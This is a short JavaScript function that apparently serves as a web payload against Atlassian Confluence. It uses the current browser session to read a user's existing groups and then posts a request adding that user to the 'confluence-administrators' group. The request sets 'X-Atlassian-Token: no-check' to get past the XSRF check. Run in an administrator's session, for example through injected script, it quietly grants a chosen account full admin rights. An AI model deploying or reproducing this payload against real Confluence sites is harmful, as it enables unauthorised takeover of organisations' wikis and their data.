function makeConfluenceAdmin(username) {
	fetch(
		`/admin/users/editusergroups-start.action?username=${encodeURIComponent(
			username
		)}`,
		{ credentials: "include" }
	)
		.then((response) => response.text())
		.then((html) => {
			// Create a DOM parser from the response and get all checkboxes where checked=checked to get all current groups of the user
			// There would probably be a JSON REST endpoint for this
			const parser = new DOMParser();
			const doc = parser.parseFromString(html, "text/html");
			const groups = doc.querySelectorAll(
				'input[type="checkbox"][checked="checked"]'
			);
			const groupIds = Array.from(groups).map((input) => input.id);

			// Create the body for the POST request
			let postBody = `username=${encodeURIComponent(
				username
			)}&save=Save&newGroups=confluence-administrators`;
			// Every group (new and existing) needs a newGroups=ID
			// newGroups=existingGroup1&newGroups=existingGroup2&newGroups=existingGroup3
			groupIds.forEach(
				(id) => (postBody += `&newGroups=${encodeURIComponent(id)}`)
			);

			// Set the new groups
			fetch(`/admin/users/editusergroups.action`, {
				method: "POST",
				body: postBody,
				headers: {
					"Content-Type": "application/x-www-form-urlencoded",
					"X-Atlassian-Token": "no-check",
				},
				credentials: "include",
			})
				.then((response) => {
					if (!response.ok) {
						console.error("Error updating user groups");
					}
				})
				.catch((error) => console.error(error));
		})
		.catch((error) => console.error(error));
}
